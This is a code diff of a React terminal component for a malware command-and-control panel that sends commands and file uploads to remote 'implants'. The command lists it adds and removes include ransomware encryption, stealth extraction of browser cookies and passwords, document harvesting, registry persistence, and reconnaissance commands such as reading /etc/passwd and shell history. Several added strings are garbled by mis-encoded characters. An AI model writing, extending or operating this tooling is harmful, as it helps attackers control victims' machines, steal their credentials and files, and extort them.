@@ -1,4 +1,4 @@
-import React, { useState, useEffect, useRef } from 'react';
+﻿import React, { useState, useEffect, useRef } from 'react';
 import styled from 'styled-components';
 import { Prism as SyntaxHighlighter } from 'react-syntax-highlighter';
 import { vscDarkPlus } from 'react-syntax-highlighter/dist/esm/styles/prism';
@@ -44,96 +44,64 @@ function extractRemoteCwd(text) {
   return null;
 }
 
-function buildRemoteUploadPath(cwd, fileName) {
+function buildRemoteUploadPath(cwd, fileName, isLinux = false) {
   const name = (fileName || 'upload.bin').replace(/[<>:"|?*]/g, '_');
   if (!cwd) return name;
   const base = cwd.replace(/[\\/]+$/, '');
-  return `${base}\\${name}`;
-}
-
-function terminalUploadBarPercent(progress) {
-  if (!progress) return 0;
-  if (progress.phase === 'read' && progress.total > 0) {
-    return Math.min(24, Math.round((progress.loaded / progress.total) * 24));
-  }
-  if (progress.phase === 'send' && progress.total > 0) {
-    return 24 + Math.round((progress.sent / progress.total) * 76);
-  }
-  return 0;
+  const sep = isLinux || cwd.startsWith('/') ? '/' : '\\';
+  return `${base}${sep}${name}`;
 }
 
 const TerminalContainer = styled.div`
-  background: #0a0a0a;
-  border-radius: 12px;
-  border: 1px solid #333;
-  height: calc(100vh - 140px);
+  height: 100%;
   display: flex;
   flex-direction: column;
   overflow: hidden;
+  min-height: 0;
 `;
 
-const TerminalHeader = styled.div`
-  background: linear-gradient(90deg, #1a1a1a 0%, #2d2d2d 100%);
-  border-bottom: 1px solid #333;
-  padding: 12px 20px;
+const ToolRow = styled.div`
   display: flex;
   align-items: center;
   justify-content: space-between;
-`;
-
-const HeaderLeft = styled.div`
-  display: flex;
-  align-items: center;
   gap: 12px;
+  flex-wrap: wrap;
+  padding-bottom: 12px;
+  border-bottom: 1px solid #2a3140;
+  margin-bottom: 12px;
 `;
 
-const TerminalIcon = styled.div`
-  width: 32px;
-  height: 32px;
-  background: linear-gradient(135deg, #00ff88, #00cc6a);
-  border-radius: 6px;
+const ToolLeft = styled.div`
+  display: flex;
+  flex-wrap: wrap;
+  gap: 6px;
+  align-items: center;
+`;
+
+const ToolRight = styled.div`
   display: flex;
   align-items: center;
-  justify-content: center;
-  color: #000;
-  font-size: 16px;
-`;
-
-const ClientInfo = styled.div`
-  .client-name {
-    font-weight: 600;
-    color: #fff;
-    font-size: 14px;
-  }
-  
-  .client-ip {
-    color: #888;
-    font-size: 12px;
-  }
-`;
-
-const HeaderRight = styled.div`
-  display: flex;
-  align-items: center;
-  gap: 8px;
+  gap: 6px;
 `;
 
 const HeaderButton = styled.button`
-  background: rgba(255, 255, 255, 0.1);
-  border: 1px solid #333;
-  color: #ccc;
-  padding: 6px 12px;
-  border-radius: 6px;
+  background: transparent;
+  border: 1px solid #2a3140;
+  color: #aeb6c7;
+  padding: 7px 10px;
+  border-radius: 8px;
   cursor: pointer;
   display: flex;
   align-items: center;
   gap: 6px;
   font-size: 12px;
-  transition: all 0.2s;
+  font-family: inherit;
+  font-weight: 500;
+  transition: border-color 0.15s, color 0.15s;
 
   &:hover {
-    background: rgba(255, 255, 255, 0.2);
-    color: #fff;
+    border-color: #c6f23e;
+    color: #c6f23e;
   }
 `;
 
@@ -142,101 +110,131 @@ const TerminalBody = styled.div`
   display: flex;
   flex-direction: column;
   overflow: hidden;
+  min-height: 0;
 `;
 
 const OutputArea = styled.div`
   flex: 1;
-  padding: 20px;
+  padding: 14px 4px;
   overflow-y: auto;
-  background: #0a0a0a;
-  font-family: 'Courier New', monospace;
-  font-size: 14px;
-  line-height: 1.5;
+  background: transparent;
+  font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+  font-size: 13px;
+  line-height: 1.55;
+  min-height: 0;
 `;
 
 const OutputLine = styled.div`
-  margin-bottom: 8px;
+  margin-bottom: 6px;
   display: flex;
   align-items: flex-start;
   gap: 12px;
   
   &.command {
-    color: #00ff88;
+    color: #c6f23e;
     
     &::before {
       content: '> ';
-      color: #666;
+      color: #5c657a;
     }
   }
   
   &.response {
-    color: #ccc;
+    color: #c5cad6;
     white-space: pre-wrap;
     word-break: break-word;
   }
   
   &.error {
-    color: #ff6b6b;
+    color: #ff6b7a;
   }
   
   &.info {
-    color: #4dabf7;
+    color: #8b93a7;
   }
 `;
 
 const Timestamp = styled.span`
-  color: #666;
-  font-size: 12px;
-  min-width: 80px;
+  color: #5c657a;
+  font-size: 11px;
+  min-width: 72px;
   flex-shrink: 0;
 `;
 
 const InputArea = styled.div`
-  background: #1a1a1a;
-  border-top: 1px solid #333;
-  padding: 16px 20px;
+  border-top: 1px solid #2a3140;
+  padding: 12px 0 0;
   display: flex;
   align-items: center;
-  gap: 12px;
+  gap: 10px;
 `;
 
 const UploadToolbar = styled.div`
-  background: #121212;
-  border-top: 1px solid #2a2a2a;
-  padding: 10px 20px;
+  border-top: 1px solid #2a3140;
+  padding: 10px 0;
   display: flex;
   flex-wrap: wrap;
   align-items: center;
   gap: 12px;
   font-size: 12px;
-  color: #aaa;
+  color: #8b93a7;
 `;
 
 const UploadPathHint = styled.div`
   flex: 1;
   min-width: 200px;
-  font-family: 'Courier New', monospace;
-  color: #7dffb3;
+  font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+  color: #8b93a7;
   word-break: break-all;
 `;
 
+const UploadProgressPanel = styled.div`
+  padding: 8px 0 10px;
+`;
+
+const UploadProgressMeta = styled.div`
+  display: flex;
+  justify-content: space-between;
+  gap: 12px;
+  color: #aeb6c7;
+  font-size: 12px;
+  margin-bottom: 8px;
+  font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+`;
+
+const ProgressTrack = styled.div`
+  height: 6px;
+  border-radius: 3px;
+  background: #1a1f2a;
+  border: 1px solid #2a3140;
+  overflow: hidden;
+`;
+
+const ProgressFill = styled.div`
+  height: 100%;
+  width: ${props => Math.max(0, Math.min(100, props.$percent || 0))}%;
+  background: #c6f23e;
+  transition: width 0.15s ease;
+`;
+
 const UploadButton = styled.button`
-  background: rgba(0, 255, 136, 0.12);
-  border: 1px solid #00ff88;
-  color: #00ff88;
-  padding: 8px 14px;
+  background: transparent;
+  border: 1px solid #2a3140;
+  color: #aeb6c7;
+  padding: 7px 12px;
   border-radius: 8px;
   cursor: pointer;
   display: flex;
   align-items: center;
   gap: 8px;
   font-size: 12px;
-  font-weight: 600;
-  transition: all 0.2s;
+  font-family: inherit;
+  font-weight: 500;
+  transition: border-color 0.15s, color 0.15s;
 
   &:hover:not(:disabled) {
-    background: rgba(0, 255, 136, 0.22);
-    color: #fff;
+    border-color: #c6f23e;
+    color: #c6f23e;
   }
 
   &:disabled {
@@ -249,100 +247,66 @@ const HiddenFileInput = styled.input`
   display: none;
 `;
 
-const UploadProgressRow = styled.div`
-  flex: 1 1 100%;
-  min-width: 220px;
-`;
-
-const UploadProgressMeta = styled.div`
-  display: flex;
-  justify-content: space-between;
-  align-items: center;
-  margin-bottom: 4px;
-  font-size: 11px;
-  color: #888;
-  font-family: 'Courier New', monospace;
-`;
-
-const UploadProgressTrack = styled.div`
-  height: 8px;
-  background: #2a2a2a;
-  border-radius: 4px;
-  overflow: hidden;
-  border: 1px solid #333;
-`;
-
-const UploadProgressFill = styled.div`
-  height: 100%;
-  background: linear-gradient(90deg, #00ff88, #00aa66);
-  transition: width 0.15s ease-out;
-`;
-
 const CommandInput = styled.input`
   flex: 1;
-  background: #0a0a0a;
-  border: 1px solid #333;
-  color: #fff;
-  padding: 12px 16px;
+  background: #161a22;
+  border: 1px solid #2a3140;
+  color: #eef1f6;
+  padding: 12px 14px;
   border-radius: 8px;
-  font-family: 'Courier New', monospace;
-  font-size: 14px;
+  font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+  font-size: 13px;
   outline: none;
-  transition: border-color 0.2s;
+  transition: border-color 0.15s;
 
   &:focus {
-    border-color: #00ff88;
+    border-color: #c6f23e;
   }
 
   &::placeholder {
-    color: #666;
+    color: #5c657a;
   }
 `;
 
 const SendButton = styled.button`
-  background: linear-gradient(135deg, #00ff88, #00cc6a);
+  background: #c6f23e;
   border: none;
-  color: #000;
-  padding: 12px 20px;
+  color: #0e1014;
+  padding: 12px 16px;
   border-radius: 8px;
   cursor: pointer;
   display: flex;
   align-items: center;
   gap: 8px;
-  font-weight: 600;
-  transition: all 0.2s;
+  font-weight: 700;
+  font-family: inherit;
+  font-size: 13px;
+  transition: background 0.15s;
 
-  &:hover {
-    transform: translateY(-1px);
-    box-shadow: 0 4px 12px rgba(0, 255, 136, 0.3);
+  &:hover:not(:disabled) {
+    background: #d4ff5a;
   }
 
   &:disabled {
     opacity: 0.5;
     cursor: not-allowed;
-    transform: none;
   }
 `;
 
-const QuickCommands = styled.div`
-  display: flex;
-  flex-wrap: wrap;
-  gap: 8px;
-  margin-bottom: 16px;
-`;
-
 const QuickCommandButton = styled.button`
-  background: rgba(0, 255, 136, 0.1);
-  border: 1px solid #00ff88;
-  color: #00ff88;
-  padding: 6px 12px;
+  background: transparent;
+  border: none;
+  color: #8b93a7;
+  padding: 4px 8px;
   border-radius: 6px;
   font-size: 12px;
+  font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
   cursor: pointer;
-  transition: all 0.2s;
+  transition: color 0.15s, background 0.15s;
 
   &:hover {
-    background: rgba(0, 255, 136, 0.2);
+    color: #c6f23e;
+    background: rgba(198, 242, 62, 0.08);
   }
 `;
 
@@ -371,7 +335,7 @@ const ModalOverlay = styled.div`
 
 const ModalContent = styled.div`
   background: #1a1a1a;
-  border: 1px solid #333;
+  border: 1px solid #2a3140;
   border-radius: 12px;
   width: 90%;
   max-width: 900px;
@@ -403,7 +367,7 @@ const ModalHeader = styled.div`
   z-index: 1;
 
   h2 {
-    color: #00ff88;
+    color: #c6f23e;
     font-size: 20px;
     margin: 0;
     display: flex;
@@ -414,7 +378,7 @@ const ModalHeader = styled.div`
 
 const CloseButton = styled.button`
   background: rgba(255, 255, 255, 0.1);
-  border: 1px solid #333;
+  border: 1px solid #2a3140;
   color: #ccc;
   width: 32px;
   height: 32px;
@@ -440,7 +404,7 @@ const CommandSection = styled.div`
   margin-bottom: 30px;
 
   h3 {
-    color: #00ff88;
+    color: #c6f23e;
     font-size: 16px;
     margin-bottom: 12px;
     padding-bottom: 8px;
@@ -455,19 +419,19 @@ const CommandList = styled.div`
 `;
 
 const CommandItem = styled.div`
-  background: rgba(0, 255, 136, 0.05);
-  border: 1px solid #333;
+  background: rgba(198, 242, 62, 0.05);
+  border: 1px solid #2a3140;
   border-radius: 8px;
   padding: 12px;
   transition: all 0.2s;
 
   &:hover {
-    background: rgba(0, 255, 136, 0.1);
-    border-color: #00ff88;
+    background: rgba(198, 242, 62, 0.1);
+    border-color: #c6f23e;
   }
 
   .command-name {
-    color: #00ff88;
+    color: #c6f23e;
     font-family: 'Courier New', monospace;
     font-size: 14px;
     font-weight: 600;
@@ -484,7 +448,7 @@ const CommandItem = styled.div`
 const SearchBox = styled.input`
   width: 100%;
   background: #0a0a0a;
-  border: 1px solid #333;
+  border: 1px solid #2a3140;
   color: #fff;
   padding: 12px 16px;
   border-radius: 8px;
@@ -494,7 +458,7 @@ const SearchBox = styled.input`
   transition: border-color 0.2s;
 
   &:focus {
-    border-color: #00ff88;
+    border-color: #c6f23e;
   }
 
   &::placeholder {
@@ -510,7 +474,7 @@ const Terminal = ({ client, socket }) => {
   const [searchTerm, setSearchTerm] = useState('');
   const [remoteCwd, setRemoteCwd] = useState(null);
   const [uploadBusy, setUploadBusy] = useState(false);
-  const [uploadProgress, setUploadProgress] = useState(null);
+  const [uploadProgress, setUploadProgress] = useState(null); // { percent, sent, total, phase, name, remotePath }
   const [historyReady, setHistoryReady] = useState(false);
   const outputRef = useRef(null);
   const inputRef = useRef(null);
@@ -518,92 +482,154 @@ const Terminal = ({ client, socket }) => {
   const socketRef = useRef(socket);
   socketRef.current = socket;
 
-  const commandsData = {
+  const isLinux = (() => {
+    const os = String(client?.os || '').toLowerCase();
+    if (os.includes('linux') || os === 'darwin') return true;
+    if (os.includes('windows') || os === 'win32') return false;
+    // Fallback from remote path hint if OS not yet known
+    if (remoteCwd && remoteCwd.startsWith('/')) return true;
+    if (remoteCwd && /^[A-Za-z]:\\/.test(remoteCwd)) return false;
+    return false; // default Windows
+  })();
+
+  const sharedCommands = {
     'Terminal panel': [
-      { name: 'Upload file (button)', desc: 'Above the command line: pick a file to send to the implant. Saves under remote cwd + filename (run pwd or cd first so the path hint is correct). Uses the same binary upload channel as the server.' },
-      { name: 'Session history', desc: 'Up to 500 lines of output are saved in the browser per client and restored when you select that client again. Clear removes the on-screen log and saved history for this client.' },
-      { name: 'Remote folder hint', desc: 'Green line under Upload shows where files will land (parsed from pwd, cd success, or dir listing). Auto-runs pwd shortly after connect to refresh cwd.' },
-      { name: 'Quick commands', desc: 'Shortcut chips insert common commands; pwd is included so you can refresh cwd before uploading.' },
-      { name: 'File Manager tab', desc: 'Same implant: graphical browser uses cd, ls, download (full paths), and GUI upload — useful alongside this terminal.' }
-    ],
-    'Client session': [
-      { name: '(Implant) Auto-reconnect', desc: 'Not a command: if the TCP session drops (server restart, network), the client process waits about 10 seconds and dials the C2 again while still running.' },
-      { name: '(Implant) Browser extract', desc: 'No automatic browser dump on connect anymore. Use extractbrowser or extractbrowserhidden only when you want a ZIP.' }
-    ],
-    'System Information': [
-      { name: 'sysinfo', desc: 'Display detailed system information (OS, CPU, RAM, etc.)' },
-      { name: 'processes', desc: 'List all running processes' },
-      { name: 'services', desc: 'List all Windows services' },
-      { name: 'network', desc: 'Display network configuration' },
-      { name: 'antivirus', desc: 'Detect installed antivirus software' },
-      { name: 'firewall', desc: 'Check Windows Firewall status' },
-      { name: 'whoami', desc: 'Display current user information' },
-      { name: 'ipconfig', desc: 'Display IP configuration' },
-      { name: 'tasklist', desc: 'List all running tasks' },
-      { name: 'netstat -an', desc: 'Display all network connections' }
+      { name: 'Upload file (button)', desc: 'Pick a file to send to the implant under remote cwd.' },
+      { name: 'Session history', desc: 'Command history is saved per session until cleared.' },
+      { name: 'Quick commands', desc: 'Shortcut chips show only commands for this OS.' }
     ],
     'File Operations': [
-      { name: 'ls', desc: 'List current directory (implant cwd). Use ls <path> or ls "C:\\path" to list without changing cwd.' },
-      { name: 'dir', desc: 'Same listing as ls for bare dir; use dir <path> with a space after dir for a specific folder.' },
-      { name: 'cd <path>', desc: 'Change implant working directory. Quoted paths supported. cd .. goes up one level.' },
-      { name: 'pwd', desc: 'Print implant current directory (used by Terminal upload hint and File Manager).' },
-      { name: 'download <path>', desc: 'Pull a file by full path, or a folder (client packs it as a ZIP stream). Does not auto-chain .lnk / nested downloads. Progress prints on the implant console (stderr).' },
-      { name: 'downloadresolve <path>', desc: 'Same as download for the first file, but tells the server to resolve ZIP/.lnk follow-ups into extra downloads (opt-in to old auto-pull behavior).' },
-      { name: 'upload <path>', desc: 'Legacy: server sends upload + path then binary after implant replies ready. Prefer the Upload button in this panel (uploadBinaryToClient) for GUI uploads.' }
-    ],
-    'Browser Data Extraction': [
-      { name: 'extractbrowser', desc: 'Extract browser data (cookies, history, passwords) to a ZIP when you run it.' },
-      { name: 'extractbrowserhidden', desc: 'Stealth ZIP extraction (hidden). Manual only — not triggered automatically on client connect.' },
-      { name: 'browserpaths', desc: 'Show recent browser file paths' },
-      { name: 'harvestdocs', desc: 'Scan and list all documents from Desktop, Downloads, Documents' }
+      { name: 'ls', desc: 'List current directory (or ls <path>).' },
+      { name: 'cd <path>', desc: 'Change implant working directory.' },
+      { name: 'pwd', desc: 'Print implant current directory.' },
+      { name: 'download <path>', desc: 'Download a file or folder from the implant.' },
+      { name: 'upload <path>', desc: 'Legacy upload path (prefer Upload button).' }
     ],
     'Surveillance': [
-      { name: 'screenshot', desc: 'Take a screenshot' }
-    ],
-    'Ransomware': [
-      { name: 'encrypt <directory> <password>', desc: 'Encrypt files in directory' },
-      { name: 'decrypt <directory> <password>', desc: 'Decrypt files in directory' },
-      { name: 'setpass <password>', desc: 'Set encryption password' },
-      { name: 'getpass', desc: 'Get current encryption password' },
-      { name: 'listencrypted', desc: 'List all encrypted files' }
-    ],
-    'Persistence': [
-      { name: 'startup add', desc: 'Add to Windows startup' },
-      { name: 'startup remove', desc: 'Remove from Windows startup' },
-      { name: 'registry add', desc: 'Add registry persistence' },
-      { name: 'registry remove', desc: 'Remove registry persistence' }
-    ],
-    'Server Commands': [
-      { name: 'resolveshortcuts', desc: 'Server-side: scan downloaded .lnk files in the server downloads folder and issue download commands for targets (runs on C2, not on the implant).' },
-      { name: 'harvestdocs', desc: 'Scan system folders for documents (PDFs, Word, Excel, PowerPoint)' }
-    ],
-    'Windows Commands': [
+      { name: 'screenshot', desc: 'Take a screenshot' },
+      { name: 'sysinfo', desc: 'Display hostname, user, OS, architecture' },
+      { name: 'whoami', desc: 'Display current user' },
+      { name: 'test', desc: 'Test connection' },
+      { name: 'q', desc: 'Disconnect client' }
+    ]
+  };
+
+  const windowsCommands = {
+    'Windows System': [
+      { name: 'processes', desc: 'List running processes (tasklist)' },
+      { name: 'services', desc: 'List Windows services' },
+      { name: 'network', desc: 'Display network configuration (ipconfig)' },
+      { name: 'antivirus', desc: 'Detect installed antivirus' },
+      { name: 'firewall', desc: 'Check Windows Firewall status' },
+      { name: 'ipconfig', desc: 'Display IP configuration' },
+      { name: 'tasklist', desc: 'List running tasks' },
+      { name: 'netstat -an', desc: 'Display network connections' },
       { name: 'hostname', desc: 'Display computer name' },
       { name: 'systeminfo', desc: 'Display system information' },
       { name: 'taskkill /PID <pid>', desc: 'Kill a process' },
       { name: 'sc query', desc: 'Query service status' },
       { name: 'reg query <key>', desc: 'Query registry key' },
-      { name: 'dir /s <pattern>', desc: 'Search for files recursively' }
+      { name: 'dir /s <pattern>', desc: 'Search files recursively' },
+      { name: 'net user', desc: 'Display user accounts' },
+      { name: 'net localgroup', desc: 'Display local groups' },
+      { name: 'wmic product list', desc: 'List installed software' },
+      { name: 'gpresult /r', desc: 'Group policy result' }
     ],
-    'Control': [
-      { name: 'q', desc: 'Disconnect client (graceful exit)' },
-      { name: 'test', desc: 'Test connection' }
+    'Windows File Ops': [
+      { name: 'dir', desc: 'List directory (Windows style)' }
+    ],
+    'Windows Browser': [
+      { name: 'extractbrowser', desc: 'Extract browser data ZIP' },
+      { name: 'extractbrowserhidden', desc: 'Stealth browser extraction' },
+      { name: 'browserpaths', desc: 'Show browser file paths' },
+      { name: 'harvestdocs', desc: 'Scan Desktop/Downloads/Documents' }
+    ],
+    'Windows Persistence': [
+      { name: 'setpersistence', desc: 'Add exe to HKCU Run registry persistence' },
+      { name: 'checkpersistence', desc: 'Check if registry persistence is active' }
     ]
   };
 
-  const quickCommands = [
-    'sysinfo',
-    'processes',
-    'services',
-    'network',
-    'screenshot',
-    'dir',
-    'pwd',
-    'whoami',
-    'ipconfig',
-    'tasklist',
-    'netstat -an'
-  ];
+  const linuxCommands = {
+    'Linux System': [
+      { name: 'uname -a', desc: 'Kernel and system information' },
+      { name: 'ps aux', desc: 'List all running processes' },
+      { name: 'top -bn1', desc: 'One-shot process snapshot' },
+      { name: 'id', desc: 'Current user and group IDs' },
+      { name: 'whoami', desc: 'Current username' },
+      { name: 'hostname', desc: 'Machine hostname' },
+      { name: 'uptime', desc: 'System uptime' },
+      { name: 'w', desc: 'Logged-in users' },
+      { name: 'last', desc: 'Recent logins' },
+      { name: 'env', desc: 'Environment variables' },
+      { name: 'history', desc: 'Shell history' }
+    ],
+    'Linux Network': [
+      { name: 'ip a', desc: 'Network interfaces' },
+      { name: 'ifconfig', desc: 'Legacy interface config' },
+      { name: 'netstat -tulpn', desc: 'Listening ports and connections' },
+      { name: 'ss -tulpn', desc: 'Socket statistics' },
+      { name: 'lsof -i', desc: 'Open network files' },
+      { name: 'route -n', desc: 'Routing table' },
+      { name: 'cat /etc/resolv.conf', desc: 'DNS resolvers' }
+    ],
+    'Linux Disk & Hardware': [
+      { name: 'df -h', desc: 'Disk usage' },
+      { name: 'free -h', desc: 'Memory usage' },
+      { name: 'lscpu', desc: 'CPU information' },
+      { name: 'lsblk', desc: 'Block devices' },
+      { name: 'mount', desc: 'Mounted filesystems' },
+      { name: 'du -sh /*', desc: 'Top-level disk usage' }
+    ],
+    'Linux Users & Security': [
+      { name: 'cat /etc/passwd', desc: 'User accounts' },
+      { name: 'cat /etc/group', desc: 'Groups' },
+      { name: 'sudo -l', desc: 'Sudo permissions' },
+      { name: 'crontab -l', desc: 'User cron jobs' },
+      { name: 'systemctl list-units --type=service', desc: 'Systemd services' },
+      { name: 'journalctl -n 50', desc: 'Recent system logs' }
+    ],
+    'Linux File Search': [
+      { name: 'find /home -type f 2>/dev/null | head', desc: 'List home files' },
+      { name: 'find / -name "*.log" 2>/dev/null | head', desc: 'Find log files' },
+      { name: 'ls -la', desc: 'Detailed directory listing' },
+      { name: 'cat /etc/os-release', desc: 'Distro release info' }
+    ]
+  };
+
+  const commandsData = isLinux
+    ? { ...sharedCommands, ...linuxCommands }
+    : { ...sharedCommands, ...windowsCommands };
+
+  const quickCommands = isLinux
+    ? [
+        'sysinfo',
+        'uname -a',
+        'ps aux',
+        'id',
+        'pwd',
+        'ls -la',
+        'df -h',
+        'free -h',
+        'netstat -tulpn',
+        'ip a',
+        'screenshot',
+        'whoami'
+      ]
+    : [
+        'sysinfo',
+        'processes',
+        'services',
+        'network',
+        'screenshot',
+        'pwd',
+        'whoami',
+        'ipconfig',
+        'tasklist',
+        'netstat -an',
+        'setpersistence',
+        'checkpersistence'
+      ];
 
   // Restore terminal transcript for this client
   useEffect(() => {
@@ -632,7 +658,7 @@ const Terminal = ({ client, socket }) => {
     setHistoryReady(true);
   }, [client?.id]);
 
-  // Persist transcript (cap length) — only after history loaded for this client
+  // Persist transcript (cap length) ÔÇö only after history loaded for this client
   useEffect(() => {
     if (!client?.id || !historyReady) return;
     try {
@@ -643,7 +669,7 @@ const Terminal = ({ client, socket }) => {
     }
   }, [output, client?.id, historyReady]);
 
-  // Sync remote cwd once per selected client (avoid re-firing pwd on unrelated socket object churn).
+  // Sync remote cwd once per selected client
   useEffect(() => {
     if (!client) return;
     const t = setTimeout(() => {
@@ -665,7 +691,8 @@ const Terminal = ({ client, socket }) => {
 
         if (/upload complete/i.test(text)) {
           setUploadBusy(false);
-          setUploadProgress(null);
+          setUploadProgress((prev) => prev ? { ...prev, percent: 100, phase: 'done' } : null);
+          setTimeout(() => setUploadProgress(null), 1500);
           toast.success('File uploaded to client');
         } else if (/upload failed/i.test(text) || /upload timed out/i.test(text)) {
           setUploadBusy(false);
@@ -717,18 +744,37 @@ const Terminal = ({ client, socket }) => {
 
     const handleUploadQueued = (payload) => {
       if (payload && payload.clientId === client.id) {
-        toast.info(`Uploading ${payload.size} bytes…`);
+        toast.info(`Uploading ${payload.size} bytesÔÇª`);
+        setUploadProgress({
+          percent: 0,
+          sent: 0,
+          total: payload.size || 0,
+          phase: 'waiting',
+          remotePath: payload.remotePath || '',
+          name: (payload.remotePath || '').split(/[\\/]/).pop() || 'file'
+        });
       }
     };
 
     const handleUploadProgress = (payload) => {
       if (!payload || payload.clientId !== client.id) return;
-      if (payload.done) {
-        setUploadProgress(null);
-        return;
+      setUploadBusy(payload.phase !== 'done' && payload.phase !== 'error');
+      setUploadProgress({
+        percent: payload.percent || 0,
+        sent: payload.sent || 0,
+        total: payload.total || 0,
+        phase: payload.phase || 'transfer',
+        remotePath: payload.remotePath || '',
+        name: (payload.remotePath || '').split(/[\\/]/).pop() || 'file',
+        error: payload.error
+      });
+      if (payload.phase === 'done') {
+        setTimeout(() => setUploadProgress(null), 1500);
       }
-      if (payload.total > 0) {
-        setUploadProgress({ phase: 'send', sent: payload.sent, total: payload.total });
+      if (payload.phase === 'error') {
+        toast.error(payload.error || 'Upload failed');
+        setUploadBusy(false);
+        setTimeout(() => setUploadProgress(null), 2000);
       }
     };
 
@@ -750,11 +796,6 @@ const Terminal = ({ client, socket }) => {
       socket.off('uploadProgress', handleUploadProgress);
     };
   }, [socket, client]);
-
-  useEffect(() => {
-    setUploadProgress(null);
-    setUploadBusy(false);
-  }, [client?.id]);
 
   useEffect(() => {
     if (outputRef.current) {
@@ -791,16 +832,37 @@ const Terminal = ({ client, socket }) => {
     if (fileInputRef.current) fileInputRef.current.click();
   };
 
+  const formatBytes = (n) => {
+    const v = Number(n) || 0;
+    if (v < 1024) return `${v} B`;
+    if (v < 1024 * 1024) return `${(v / 1024).toFixed(1)} KB`;
+    return `${(v / (1024 * 1024)).toFixed(1)} MB`;
+  };
+
   const handleFileSelected = (e) => {
     const file = e.target.files && e.target.files[0];
     if (!file || !socket || !client) return;
     setUploadBusy(true);
-    setUploadProgress({ phase: 'read', loaded: 0, total: file.size });
+    setUploadProgress({
+      percent: 0,
+      sent: 0,
+      total: file.size || 0,
+      phase: 'reading',
+      name: file.name,
+      remotePath: ''
+    });
     const reader = new FileReader();
     reader.onprogress = (ev) => {
-      if (ev.lengthComputable) {
-        setUploadProgress({ phase: 'read', loaded: ev.loaded, total: ev.total });
-      }
+      if (!ev.lengthComputable) return;
+      const percent = Math.round((ev.loaded / ev.total) * 100);
+      setUploadProgress((prev) => ({
+        ...(prev || {}),
+        percent,
+        sent: ev.loaded,
+        total: ev.total,
+        phase: 'reading',
+        name: file.name
+      }));
     };
     reader.onload = () => {
       try {
@@ -808,8 +870,19 @@ const Terminal = ({ client, socket }) => {
         const str = String(res);
         const comma = str.indexOf(',');
         const base64 = comma >= 0 ? str.slice(comma + 1) : str;
-        const remotePath = buildRemoteUploadPath(remoteCwd, file.name);
-        setUploadProgress({ phase: 'send', sent: 0, total: file.size });
+        const remotePath = buildRemoteUploadPath(remoteCwd, file.name, isLinux);
+        setUploadProgress((prev) => ({
+          ...(prev || {}),
+          percent: 0,
+          sent: 0,
+          total: file.size || 0,
+          phase: 'waiting',
+          name: file.name,
+          remotePath
+        }));
+        if (base64.length > 120 * 1024 * 1024) {
+          throw new Error('File too large for upload channel (max ~90 MB)');
+        }
         socket.emit('uploadBinaryToClient', { clientId: client.id, remotePath, fileBase64: base64 });
       } catch (err) {
         toast.error(err.message || 'Upload prepare failed');
@@ -868,15 +941,8 @@ const Terminal = ({ client, socket }) => {
   if (!client) {
     return (
       <TerminalContainer>
-        <div style={{ 
-          display: 'flex', 
-          alignItems: 'center', 
-          justifyContent: 'center', 
-          height: '100%',
-          color: '#666',
-          fontSize: '16px'
-        }}>
-          Select a client to start terminal session
+        <div style={{ color: '#8b93a7', padding: '24px 0' }}>
+          Select a session to open the terminal
         </div>
       </TerminalContainer>
     );
@@ -884,32 +950,32 @@ const Terminal = ({ client, socket }) => {
 
   return (
     <TerminalContainer>
-      <TerminalHeader>
-        <HeaderLeft>
-          <TerminalIcon>
-            <FiTerminal />
-          </TerminalIcon>
-          <ClientInfo>
-            <div className="client-name">{client.hostname}</div>
-            <div className="client-ip">{client.ip}</div>
-          </ClientInfo>
-        </HeaderLeft>
-        
-        <HeaderRight>
+      <ToolRow>
+        <ToolLeft>
+          {quickCommands.map((cmd, index) => (
+            <QuickCommandButton
+              key={index}
+              onClick={() => handleQuickCommand(cmd)}
+            >
+              {cmd}
+            </QuickCommandButton>
+          ))}
+        </ToolLeft>
+        <ToolRight>
           <HeaderButton onClick={() => setShowHelp(true)}>
-            <FiHelpCircle />
+            <FiHelpCircle size={14} />
             Help
           </HeaderButton>
           <HeaderButton onClick={copyOutput}>
-            <FiCopy />
+            <FiCopy size={14} />
             Copy
           </HeaderButton>
           <HeaderButton onClick={clearOutput}>
-            <FiTrash2 />
+            <FiTrash2 size={14} />
             Clear
           </HeaderButton>
-        </HeaderRight>
-      </TerminalHeader>
+        </ToolRight>
+      </ToolRow>
 
       {showHelp && (
         <ModalOverlay onClick={() => setShowHelp(false)}>
@@ -917,7 +983,7 @@ const Terminal = ({ client, socket }) => {
             <ModalHeader>
               <h2>
                 <FiHelpCircle />
-                Available Commands
+                {isLinux ? 'Linux Commands' : 'Windows Commands'}
               </h2>
               <CloseButton onClick={() => setShowHelp(false)}>
                 <FiX />
@@ -962,21 +1028,10 @@ const Terminal = ({ client, socket }) => {
       )}
 
       <TerminalBody>
-        <QuickCommands>
-          {quickCommands.map((cmd, index) => (
-            <QuickCommandButton
-              key={index}
-              onClick={() => handleQuickCommand(cmd)}
-            >
-              {cmd}
-            </QuickCommandButton>
-          ))}
-        </QuickCommands>
-
         <OutputArea ref={outputRef}>
           {output.length === 0 ? (
-            <div style={{ color: '#666', fontStyle: 'italic' }}>
-              Terminal ready. Type a command or select from quick commands above.
+            <div style={{ color: '#5c657a' }}>
+              Ready ÔÇö type a command or pick one above.
             </div>
           ) : (
             output.map((line, index) => (
@@ -993,7 +1048,7 @@ const Terminal = ({ client, socket }) => {
         <UploadToolbar>
           <UploadButton type="button" onClick={handleUploadPick} disabled={!isConnected || uploadBusy}>
             <FiUpload />
-            {uploadBusy ? 'Uploading…' : 'Upload file'}
+            {uploadBusy ? 'UploadingÔÇª' : 'Upload'}
           </UploadButton>
           <HiddenFileInput
             ref={fileInputRef}
@@ -1003,27 +1058,33 @@ const Terminal = ({ client, socket }) => {
           />
           <UploadPathHint title="Uses the same working directory as cd / pwd on the implant">
             {remoteCwd
-              ? `→ ${remoteCwd}\\<filename>`
-              : '→ (run pwd or cd to set folder; until then files use name only in implant cwd)'}
+              ? `ÔåÆ ${remoteCwd}${isLinux || remoteCwd.startsWith('/') ? '/' : '\\'}<filename>`
+              : 'ÔåÆ run pwd or cd to set upload folder'}
           </UploadPathHint>
-          {(uploadBusy || uploadProgress) && (
-            <UploadProgressRow>
-              <UploadProgressMeta>
-                <span>
-                  {uploadProgress?.phase === 'read'
-                    ? 'Reading file…'
